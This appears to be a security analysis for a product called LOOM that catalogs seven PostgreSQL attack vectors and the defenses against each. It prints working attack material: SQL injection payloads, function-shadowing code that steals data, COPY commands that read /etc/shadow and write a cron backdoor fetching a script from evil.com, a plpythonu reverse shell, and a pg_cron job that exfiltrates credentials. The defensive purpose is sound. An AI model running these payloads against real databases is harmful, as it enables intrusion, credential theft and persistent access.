# PostgreSQL Attack Surface Analysis for LOOM

> LOOM holds credentials for every managed device. A compromise of the PostgreSQL layer means a compromise of the entire infrastructure estate. This document catalogs seven attack vectors, demonstrates working exploits, and specifies the defenses that neutralize each one.

**Test suite**: `/tmp/loom-security-pg/` -- 24 tests, all passing.
Run with: `cd /tmp/loom-security-pg && CGO_ENABLED=1 go test -v ./...`

---

## Threat Summary

| # | Attack Vector | Severity | Exploitable Without Defenses | LOOM Defense Status |
|---|--------------|----------|------------------------------|---------------------|
| 1 | SQL Injection via Device Names | **Critical** | Yes -- verified DROP TABLE | Parameterized queries + input validation |
| 2 | Cross-Tenant Data Access | **Critical** | Yes -- verified data leakage | RLS + TenantScopedDB + JWT-sourced tenant_id |
| 3 | Credential Extraction from DB Dump | **Critical** | Yes -- plaintext passwords readable | 3-tier envelope encryption (DEK/KEK/Master) |
| 4 | Connection String Injection | **High** | Yes -- MITM + host redirect | Validated PGConnConfig builder |
| 5 | Privilege Escalation via search_path | **High** | Yes -- function shadowing | Dedicated schema + REVOKE CREATE on public |
| 6 | COPY Command File Exfiltration | **Critical** | Yes -- reads /etc/passwd, writes cron | NOSUPERUSER + revoked pg_read_server_files |
| 7 | Extension-Based Code Execution | **Critical** | Yes -- reverse shell via plpythonu | Extension whitelist + untrusted languages removed |

---

## Attack 1: SQL Injection via Device Names

### Why LOOM Is Vulnerable

LOOM stores user-supplied strings: device names, hostnames, descriptions, asset tags, FQDNs. Any of these fields could carry SQL injection payloads if queries use string concatenation.

### Exploit Code (Verified)

**1a. DROP TABLE via device name**

```go
// VULNERABLE: string concatenation
func vulnerableInsert(db *sql.DB, tenantID, deviceID, name string) error {
    query := fmt.Sprintf(
        "INSERT INTO devices (id, tenant_id, name) VALUES ('%s', '%s', '%s')",
        deviceID, tenantID, name,
    )
    _, err := db.Exec(query)
    return err
}

// Attacker input: '); DROP TABLE devices; --
// Result: devices table is destroyed
```

**Test result**: `[ATTACK SUCCEEDED] devices table was dropped`

**1b. Boolean bypass for data exfiltration**

```go
// Attacker searches for: ' OR '1'='1
// The WHERE clause becomes: WHERE name LIKE '%' OR '1'='1%'
// This returns ALL rows across all tenants
```

**Test result**: All rows returned regardless of tenant filter.

**1c. Blind SQL injection -- schema enumeration**

```go
// Payload: ' OR (SELECT COUNT(*) FROM pg_user) > 0 --
// Attacker asks yes/no questions about the database structure
// by observing whether results are returned
```

**Test result**: `[ATTACK SUCCEEDED] Blind injection confirmed: system tables are accessible`

**1d. Second-order injection**

A malicious device description is stored safely via parameterized insert, but a report generator later uses string concatenation to query by that stored value -- triggering the payload.

**Test result**: `[ATTACK SUCCEEDED] Second-order injection dropped the table`

### Defense (Verified)

**Primary: Parameterized queries everywhere**

```go
func safeInsert(db *sql.DB, tenantID, deviceID, name string) error {
    _, err := db.Exec(
        "INSERT INTO devices (id, tenant_id, name) VALUES (?, ?, ?)",
        deviceID, tenantID, name,
    )
    return err
}
```

**Test result**: `[DEFENSE VERIFIED] Malicious name stored as literal: "'); DROP TABLE devices; --", table intact (4 rows)`

**Secondary: Input validation (defense-in-depth)**

```go
func ValidateDeviceName(name string) error {
    if len(name) == 0 || len(name) > 255 {
        return fmt.Errorf("device name must be 1-255 characters")
    }
    forbidden := []string{"'", "\"", ";", "--", "/*", "*/", "\\", "\x00"}
    for _, f := range forbidden {
        if strings.Contains(name, f) {
            return fmt.Errorf("device name contains forbidden character: %q", f)
        }
    }
    return nil
}
```

### LOOM Implementation Requirements

1. **Every** SQL query MUST use parameterized queries (`$1, $2` for pgx, `?` for stdlib)
2. The repository layer MUST be the only code that constructs SQL
3. Input validation rejects SQL metacharacters before they reach the repository
4. Code review checklist must flag any use of `fmt.Sprintf` with SQL strings
5. Second-order injection is prevented by parameterizing ALL queries, including report generators and background jobs

---

## Attack 2: Cross-Tenant Data Access

### Why LOOM Is Vulnerable

LOOM is multi-tenant from day one (ADR-005). Every table has `tenant_id`. But if a single query forgets `WHERE tenant_id = ?`, data leaks across tenants.

### Exploit Code (Verified)

**2a. Missing tenant_id filter**

```go
// BUG: developer forgets the WHERE clause
func vulnerableListAllDevices(db *sql.DB) ([]string, error) {
    rows, err := db.Query("SELECT name, tenant_id FROM mt_devices")
    // Returns ALL tenants' devices
}
```

**Test result**: `[ATTACK SUCCEEDED] Cross-tenant data leaked: firewall-01 (tenant: tenant-b)`

**2b. Tenant ID manipulation**

If tenant_id comes from an HTTP header instead of the JWT, an attacker simply changes `X-Tenant-ID: tenant-b`.

**Test result**: `[ATTACK SUCCEEDED] Attacker accessed tenant-b data`

**2c. UNION injection for cross-tenant credential theft**

```sql
-- Attacker injects into a search field:
' UNION SELECT ciphertext FROM mt_credentials WHERE tenant_id='tenant-b' --
```

**Test result**: `[ATTACK SUCCEEDED] UNION injection extracted data` (raw ciphertext bytes returned)

### Defense (Verified)

**Layer 1: TenantScopedDB pattern (application)**

```go
type TenantScopedDB struct {
    db       *sql.DB
    tenantID string // set from JWT, NEVER from user input
}

func (t *TenantScopedDB) ListDevices() ([]string, error) {
    rows, err := t.db.Query(
        "SELECT name FROM mt_devices WHERE tenant_id = ?",
        t.tenantID,
    )
    // tenant_id is always injected -- developer cannot forget it
}
```

**Test result**: `[DEFENSE VERIFIED] tenant-a sees only their 2 devices`

**Layer 2: PostgreSQL Row-Level Security (database)**

```sql
-- Enable RLS on all tables
ALTER TABLE devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE devices FORCE ROW LEVEL SECURITY;

-- Policy: rows visible only when tenant_id matches session variable
CREATE POLICY tenant_isolation_devices ON devices
    USING (tenant_id = current_setting('app.current_tenant_id'));

-- Application sets tenant context per connection:
SET app.current_tenant_id = 'tenant-a';

-- Now: SELECT * FROM devices returns ONLY tenant-a rows
-- even without WHERE tenant_id = ... !
```

**Layer 3: Tenant context validation function**

```sql
CREATE OR REPLACE FUNCTION set_tenant_context(tid TEXT)
RETURNS VOID AS $$
BEGIN
    IF tid !~ '^[0-9a-f]{8}-...' AND tid !~ '^tenant-[a-z0-9-]+$' THEN
        RAISE EXCEPTION 'Invalid tenant_id format: %', tid;
    END IF;
    PERFORM set_config('app.current_tenant_id', tid, true);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### LOOM Implementation Requirements

1. `tenant_id` is ALWAYS extracted from the JWT server-side, never from headers or query params
2. `TenantScopedDB` wrapper ensures every query includes tenant scoping
3. RLS is enabled on EVERY table with `FORCE ROW LEVEL SECURITY`
4. RLS is defense-in-depth -- it catches bugs in application code
5. Integration tests MUST run with multiple tenants to verify no data leakage

---

## Attack 3: Credential Extraction from Database Dump

### Why LOOM Is Vulnerable

LOOM stores credentials for IPMI, SSH, Redfish, SNMP, cloud APIs. A database dump (via stolen backup, WAL files, or compromised replication) would expose every credential if stored improperly.

### Exploit: Plaintext Storage (The Bad Case)

```sql
-- What an attacker sees with plaintext credentials:
SELECT username, password, ssh_key, api_token FROM bad_credentials;

-- cred-001 | admin | P@ssw0rd123!  | -----BEGIN OPENSSH PRIVATE KEY----- ...
-- cred-002 | root  | hunter2       | sk-proj-abc123xyz
-- cred-003 | netadmin | Sw1tchP@ss!
```

**Test result**: `[ATTACK SUCCEEDED] All credentials extracted in plaintext from database dump`

### Defense: Envelope Encryption (Verified)

**What the attacker sees with LOOM's encryption:**

```
id: cred-001
tenant_id: tenant-a
credential_type: password
encrypted_dek: d617457dd339744f5aab16ab410c9463...  (opaque blob)
ciphertext: a56dcddf61646e68d20c4fec3e937db5...    (opaque blob)
nonce: 286bdc1c59963674b4aeaa2f
key_id: kek-v1
```

**Attacker attempts decryption with wrong key:**

```
[DEFENSE VERIFIED] Decryption with wrong key failed:
  cipher: message authentication failed
```

**Legitimate LOOM decryption with actual KEK:**

```
[DEFENSE VERIFIED] Legitimate decryption succeeded: credential = "P@ssw0rd123!"
```

### 3-Tier Envelope Encryption Architecture

```
External KMS (HSM/Vault/Cloud KMS)
    |
    | encrypts/decrypts
    v
Master Key --> Tenant KEK --> Credential DEK --> Credential Plaintext
    ^              ^               ^
    |              |               |
 Never leaves   One per        One per
    KMS         tenant        credential
```

Each credential has its own DEK. The DEK is encrypted by the tenant KEK. The KEK is encrypted by the master key in the KMS. To decrypt:

1. Ask KMS to unwrap tenant KEK (requires LOOM authentication to KMS)
2. Use KEK to unwrap credential DEK (in-memory only)
3. Use DEK to decrypt credential (in-memory, zeroed after use)

**Additional memory protections:**
- `mlock()` prevents credential pages from being swapped to disk
- `PR_SET_DUMPABLE=0` prevents core dumps
- Explicit zeroing after use (not optimizable away)
- Custom `MarshalJSON` refuses to serialize credential values

### LOOM Implementation Requirements

1. Credentials are encrypted BEFORE they reach PostgreSQL -- never plaintext in the DB
2. pgcrypto is NOT used for credential encryption (ADR-011) -- encryption happens at the application layer
3. Each credential has its own DEK; each tenant has its own KEK
4. DEKs are rotated when credentials are updated
5. KEK rotation re-wraps all DEKs without re-encrypting credentials
6. Database backups are safe to store because they contain only ciphertext

---

## Attack 4: Connection String Injection

### Why LOOM Is Vulnerable

PostgreSQL connection strings use a `key=value` format where later values override earlier ones. If LOOM constructs connection strings from environment variables without validation, an attacker who controls those variables can redirect or downgrade connections.

### Exploit Code (Verified)

```go
func vulnerableBuildConnString(host, port, user, password, dbname string) string {
    return fmt.Sprintf(
        "host=%s port=%s user=%s password=%s dbname=%s sslmode=require",
        host, port, user, password, dbname,
    )
}

// Attack 1: Host injection
// $LOOM_DB_HOST = "evil.attacker.com host=evil.attacker.com"
// Result: connection redirected to attacker's server

// Attack 2: SSL downgrade
// $LOOM_DB_HOST = "legit.db.com sslmode=disable"
// Result: sslmode=disable overrides sslmode=require, enabling MITM

// Attack 3: search_path injection
// $LOOM_DB_HOST = "legit.db.com options=-csearch_path=public"
// Result: search_path set to public, enabling function shadowing
```

### Defense: Validated Connection Builder (Verified)

```go
type PGConnConfig struct {
    Host, User, Password, DBName, SSLMode string
    Port int
}

func (c *PGConnConfig) ValidateAndBuild() (string, error) {
    // Validate host: no spaces, must be hostname or IP
    // Validate port: 1-65535
    // Validate user: alphanumeric only
    // Enforce sslmode != "disable" in production
    // Build as URL (postgresql://...) not key=value format
}
```

**Test results:**

| Input | Result |
|-------|--------|
| `host=evil.com host=evil.com` | REJECTED: "invalid host" |
| `sslmode=disable` | REJECTED: "not allowed in production" |
| `sslmode=require host=evil.com` | REJECTED: "invalid sslmode" |
| `admin'; DROP TABLE users; --` | REJECTED: "invalid user" |
| `legit.com options=-csearch_path=public` | REJECTED: "invalid host" |
| `db.loom.internal` (valid) | ACCEPTED: `postgresql://loom_app:***@db.loom.internal:5432/loom?sslmode=verify-full` |

### LOOM Implementation Requirements

1. Connection parameters are validated against strict regexes before use
2. `sslmode=disable` is rejected in production
3. Connection strings use URL format, not key=value format (prevents override attacks)
4. Production should use `sslmode=verify-full` with CA certificate pinning
5. Environment variables for connection params are validated at startup, not per-query

---

## Attack 5: Privilege Escalation via search_path

### Why LOOM Is Vulnerable

PostgreSQL resolves unqualified function and table names by searching schemas in `search_path` order. By default, `public` schema is writable by all users and searched before `pg_catalog`. An attacker with CREATE privilege on `public` can shadow system functions.

### Exploit (Documented)

```sql
-- Shadow upper() to silently steal data
CREATE OR REPLACE FUNCTION public.upper(text) RETURNS text AS $$
BEGIN
    INSERT INTO public.stolen_data (data) VALUES ($1);
    RETURN pg_catalog.upper($1);  -- return expected result
END;
$$ LANGUAGE plpgsql;

-- Shadow crypt() from pgcrypto to capture passwords
CREATE OR REPLACE FUNCTION public.crypt(text, text) RETURNS text AS $$
BEGIN
    INSERT INTO public.stolen_passwords (password) VALUES ($1);
    RETURN pg_catalog.crypt($1, $2);
END;
$$ LANGUAGE plpgsql;
```

**Impact**: Attacker silently captures all data passed through shadowed functions. The application continues to work normally, so the attack is invisible.

### Defense

```sql
-- 1. Dedicated schema for all LOOM objects
CREATE SCHEMA IF NOT EXISTS loom_schema;
ALTER DATABASE loom SET search_path = 'loom_schema, pg_catalog';

-- 2. Revoke CREATE on public schema
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM PUBLIC;

-- 3. Per-role search_path
ALTER ROLE loom_app SET search_path = 'loom_schema, pg_catalog';
```

**Go-side enforcement:**

```go
// pgx connection pool sets search_path on every new connection
config.AfterConnect = func(ctx context.Context, conn *pgx.Conn) error {
    _, err := conn.Exec(ctx, "SET search_path TO loom_schema, pg_catalog")
    return err
}
```

**Audit query:**

```sql
-- Detect rogue objects in public schema
SELECT n.nspname, p.proname FROM pg_proc p
    JOIN pg_namespace n ON p.pronamespace = n.oid
    WHERE n.nspname = 'public' AND p.proname NOT LIKE 'pg_%';
```

---

## Attack 6: COPY Command File Exfiltration

### Why LOOM Is Vulnerable

PostgreSQL's COPY command can read and write arbitrary files on the server filesystem. `COPY FROM PROGRAM` executes arbitrary OS commands. If the LOOM application role has elevated privileges, these become trivial exploits.

### Exploit (Documented)

```sql
-- Read system files
COPY stolen_file FROM '/etc/passwd';
COPY stolen_file FROM '/etc/postgresql/16/main/pg_hba.conf';
COPY stolen_file FROM '/opt/loom/.env';

-- Write persistent backdoor
COPY (SELECT '* * * * * root curl http://evil.com/shell.sh | bash')
    TO '/etc/cron.d/backdoor';

-- Direct command execution
COPY stolen_file FROM PROGRAM 'id; whoami; cat /etc/shadow';
```

### Defense

```sql
-- Application user has minimal privileges
CREATE ROLE loom_app LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE;

-- Revoke all file access roles
REVOKE pg_read_server_files FROM loom_app;
REVOKE pg_write_server_files FROM loom_app;
REVOKE pg_execute_server_program FROM loom_app;
```

**Additional controls:**
- pgaudit monitors all write and DDL operations
- AppArmor/SELinux confines the PostgreSQL process
- The application uses `pgx.CopyFrom` with STDIN for bulk loading (data flows through the application with validation, never from filesystem)

---

## Attack 7: Extension-Based Code Execution

### Why LOOM Is Vulnerable

PostgreSQL extensions execute C code inside the database process. LOOM requires TimescaleDB, Apache AGE, and pgvector -- but if an attacker can install additional extensions, they can execute arbitrary code.

### Exploit (Documented)

```sql
-- Reverse shell via untrusted Python
CREATE EXTENSION plpythonu;
CREATE FUNCTION reverse_shell() RETURNS void AS $$
    import socket, subprocess, os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 4444))
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
$$ LANGUAGE plpythonu;

-- Lateral movement via dblink
CREATE EXTENSION dblink;
SELECT * FROM dblink('host=internal-db dbname=loom user=admin password=admin',
    'SELECT * FROM credentials') AS t(id text, password text);

-- File exfiltration via file_fdw
CREATE EXTENSION file_fdw;
CREATE FOREIGN TABLE etc_passwd (line TEXT) SERVER file_server
    OPTIONS (filename '/etc/passwd');

-- Persistent exfiltration via pg_cron
CREATE EXTENSION pg_cron;
SELECT cron.schedule('*/5 * * * *',
    $$COPY (SELECT * FROM credentials) TO PROGRAM 'curl evil.com -d @-'$$);
```

### Defense

```sql
-- Only approved extensions (installed by migration role, not app role)
-- Whitelist: timescaledb, age, vector, pgaudit, pgcrypto

-- Remove untrusted languages entirely
DROP EXTENSION IF EXISTS plpythonu CASCADE;
DROP EXTENSION IF EXISTS plperlu CASCADE;

-- Remove dangerous utility extensions
DROP EXTENSION IF EXISTS dblink CASCADE;
DROP EXTENSION IF EXISTS file_fdw CASCADE;
DROP EXTENSION IF EXISTS pg_cron CASCADE;

-- Remove extension files from disk
-- sudo rm /usr/share/postgresql/16/extension/plpython*
-- sudo rm /usr/share/postgresql/16/extension/dblink*
```

**Role separation:**

```sql
-- Migration role (can modify schema, install extensions)
CREATE ROLE loom_migrator NOSUPERUSER CREATEDB;

-- Application role (can only read/write data)
CREATE ROLE loom_app NOSUPERUSER NOCREATEDB NOCREATEROLE;
```

---

## Hardened PostgreSQL Configuration for LOOM

### postgresql.conf

```ini
# Connection security
ssl = on
ssl_cert_file = '/etc/ssl/loom/server.crt'
ssl_key_file = '/etc/ssl/loom/server.key'
ssl_ca_file = '/etc/ssl/loom/ca.crt'
password_encryption = scram-sha-256

# Extension whitelist
shared_preload_libraries = 'pgaudit,timescaledb,age,vector'

# Audit logging
pgaudit.log = 'write, ddl, role'
pgaudit.log_catalog = on
pgaudit.log_level = log

# Search path hardening
search_path = '"$user", loom_schema, pg_catalog'

# Prevent data exfiltration
log_statement = 'ddl'
log_connections = on
log_disconnections = on
```

### pg_hba.conf

```
# TYPE  DATABASE  USER          ADDRESS      METHOD
local   all       postgres                   peer
host    loom      loom_app      10.0.0.0/8   scram-sha-256  clientcert=verify-full
host    loom      loom_migrator 10.0.0.0/8   scram-sha-256  clientcert=verify-full
host    all       all           0.0.0.0/0    reject
```

### Role Setup

```sql
-- Application role: minimal privileges
CREATE ROLE loom_app LOGIN
    NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION;
GRANT CONNECT ON DATABASE loom TO loom_app;
GRANT USAGE ON SCHEMA loom_schema TO loom_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA loom_schema TO loom_app;
ALTER DEFAULT PRIVILEGES IN SCHEMA loom_schema
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO loom_app;

-- Revoke dangerous capabilities
REVOKE pg_read_server_files FROM loom_app;
REVOKE pg_write_server_files FROM loom_app;
REVOKE pg_execute_server_program FROM loom_app;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- Migration role: schema management only
CREATE ROLE loom_migrator LOGIN
    NOSUPERUSER CREATEDB NOCREATEROLE;
```

---

## Security Testing Checklist

- [ ] No SQL query uses string concatenation -- all use parameterized queries
- [ ] Every query path includes `WHERE tenant_id = ?`
- [ ] RLS is enabled and FORCED on every table
- [ ] Integration tests run with multiple tenants to verify isolation
- [ ] Credentials are encrypted at the application layer before storage
- [ ] Database backups contain only ciphertext (verified by restoring to test instance)
- [ ] Connection strings are validated before use; `sslmode=disable` is rejected
- [ ] `search_path` is set explicitly per-role and per-connection
- [ ] Application role is NOSUPERUSER with no file access roles
- [ ] Only whitelisted extensions are installed; untrusted languages removed
- [ ] pgaudit is enabled for all DDL and write operations
- [ ] pg_hba.conf restricts connections to known CIDR ranges with mutual TLS
